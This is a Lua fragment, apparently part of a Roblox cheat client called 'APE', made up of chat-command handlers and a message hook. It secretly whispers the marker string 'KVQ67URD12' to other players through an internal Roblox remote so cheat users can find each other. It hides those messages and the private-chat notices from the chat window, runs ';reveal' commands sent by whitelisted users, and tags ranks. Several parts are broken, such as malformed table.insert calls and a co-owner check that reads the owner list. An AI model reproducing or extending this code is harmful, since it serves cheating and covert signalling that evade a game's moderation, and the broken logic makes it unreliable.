			if privatePlayer then
			local textChatService = game:GetService("TextChatService")
			wait(0.0001)
			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("APE By RayHafz")
			else
				print("No private player found!")
			end
		end,
		[";reveal privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
			local textChatService = game:GetService("TextChatService")
			wait(0.0001)
			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("APE By RayHafz")
			else
				print("No private+ player found!")
			end
		end,
		[";reveal coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
			local textChatService = game:GetService("TextChatService")
			wait(0.0001)
			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("APE By RayHafz")
			else
				print("No coowner player found!")
			end
		end,
		[";reveal owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
			local textChatService = game:GetService("TextChatService")
			wait(0.0001)
			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("APE By RayHafz")
			else
				print("No owner player found!")
			end
		end,
		[";reveal homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
			local textChatService = game:GetService("TextChatService")
			wait(0.0001)
			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("APE By RayHafz")
			else
				print("No homies player found!")
			end
		end,
	}
	function isPlayerAllowed()
		return false
	end
	
	local txt = game:GetService("TextChatService")
	local private = {}
	local privateplus = {}
	local coowner = {}
	local owner = {}
	local homies = {}
	local users = {}
	
	task.spawn(function()
		repeat task.wait()
			for i,plr in pairs(plr:GetPlayers()) do 
				if table.find(private,plr) then return end
				if not CanAttackUser(plr) then
					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
					local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
					newchannel:SendAsync("KVQ67URD12")
					table.insert(private,privateplus,coowner,owner,plr)
					task.wait(1)
					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
				end
			end
		until false
	end)
	
	local users = {}
	
	txt.OnIncomingMessage = function(msg)
		local p = Instance.new("TextChatMessageProperties")
		local message = msg
		if msg.TextSource then
			local plr2
			local userId = tostring(msg.TextSource.UserId)
			for i,v in pairs(plr:GetPlayers()) do
				if tostring(v.UserId) == userId then
					plr2 = v
					break
				end
			end
			local otherPriority, plrattackable, plrtag = WhitelistFunctionsAreFunny:GetWhitelist(plr2)
			if CanAttackUser(plr2) and plr2 ~= lplr then
				if msg.Text:find("KVQ67URD12") then
					warningNotification("Vape",plr2.Name.."is using APE!",60)
					table.insert(users,plr2.UserId)
				end
			end
			if msg.Text:find("KVQ67URD12") or msg.Text:lower():find("privately") then
				p.PrefixText = ""
				return p
			end
			for i,v in pairs(commands) do
				if tostring(i) == tostring(msg.Text).." default" or tostring(i) == tostring(msg.Text).." "..lplr.DisplayName or tostring(i) == tostring(msg.Text) then
					local plr
					for i,v in pairs(plr:GetPlayers()) do
						if tostring(v.UserId) == userId then
							plr = v
							break
						end
					end
					if plr == nil then break end
					if not CanAttackUser(plr) then
						v()
					end
					break
				end
			end
			local colors = {
				["red"] = "#ff0000",
				["orange"] = "#ff7800",
				["yellow"] = "#e5ff00",
				["green"] = "#00ff00",
				["blue"] = "#0000ff",
				["purple"] = "#b800b8",
				["pink"] = "#ff00ff",
				["black"] = "#000000",
				["white"] = "#ffffff",
				["cyan"] =  "#00ffff",
			}
			if CanAttackUser(plr2) and plr2 ~= lplr then
				if msg.Text:find("KVQ67URD12") then
					warningNotification("Vape",plr2.Name.." is APE user!",60)
					table.insert(users,plr2.UserId)
					table.insert(whitelist["tags"],{
						userid = plr2.UserId,
						color = "yellow",
						tag = "APE USER"
					})
				end
			end
			if msg.Text:lower():find("kvq67urd12") or msg.Text:lower():find("you are now privately chatting") then 
				p.PrefixText = ""
				msg.Text = ""
				return p
			end
			for i,v in pairs(commands) do
				if tostring(i) == tostring(msg.Text) then
					local plr
					for i,v in pairs(plr:GetPlayers()) do
						if tostring(v.UserId) == userId then
							plr = v
							break
						end
					end
					if plr == nil or plr == lplr then break end
					if not CanAttackUser(plr) then
						v()
					end
					break
				end
			end
			p.PrefixText = msg.PrefixText
			print(msg.Text,":",userId)
	
			local userType = 0
			local hasTag = false
			if users[plr2.UserId] ~= nil then
				p.PrefixText = "<font color='"..colors["yellow"].."'>[APE USER]</font> " .. msg.PrefixText
				hasTag = true
				return p
			end
	
			if whitelist["tags"] ~= nil then
				for i, v in pairs(whitelist["tags"]) do
					if v.userid == userId then
						hasTag = true
						local color = colors[v.color] or colors["yellow"]
						p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
					end
				end
			end
	
			if whitelist["Private"] ~= nil then
				for i, v in pairs(whitelist["Private"]) do
					if v.id == userId then
						if not hasTag then
							hasTag = true
							p.PrefixText = "<font color='"..colors["purple"].."'>[APE PRIVATE]</font> " .. msg.PrefixText
						end
						userType = 1
					end
				end
			end
	
			if whitelist["PrivatePlus"] ~= nil then
				for i, v in pairs(whitelist["PrivatePlus"]) do
					if v.id == userId then
						if not hasTag then
							hasTag = true
							p.PrefixText = "<font color='"..colors["purple"].."'>[APE PRIVATE+]</font> " .. msg.PrefixText
						end
						userType = 2
					end
				end
			end
	
			if whitelist["CoOwner"] ~= nil then
				for i, v in pairs(whitelist["Owner"]) do
					if v.id == userId then
						if not hasTag then
							hasTag = true
							p.PrefixText = "<font color='"..colors["black"].."'>[CO-APE OWNER]</font> " .. msg.PrefixText
						end
						userType = 3
					end
				end
			end
			
			if whitelist["Owner"] ~= nil then
				for i, v in pairs(whitelist["Owner"]) do
					if v.id == userId then
						if not hasTag then
							hasTag = true
							p.PrefixText = "<font color='"..colors["red"].."'>[APE OWNER]</font> " .. msg.PrefixText
						end
						userType = 4
					end
				end
			end
			
			if whitelist["Homies"] ~= nil then
				for i, v in pairs(whitelist["Homies"]) do
					if v.id == userId then
						if not hasTag then
							hasTag = true
							p.PrefixText = "<font color='"..colors["orange"].."'>[HOMIES OF APE😎]</font> " .. msg.PrefixText
						end
						userType = 5
					end
				end
			end
			
			if whitelist["RayHafz"] ~= nil then
				for i, v in pairs(whitelist["RayHafz"]) do
					if v.id == userId then
						if not hasTag then
							hasTag = true
							p.PrefixText = "<font color='"..colors["pink"].."'>[RayHafz Femboy💜]</font> " .. msg.PrefixText
						end
						userType = 6
					end
				end
			end
		end
	
		return p
	end
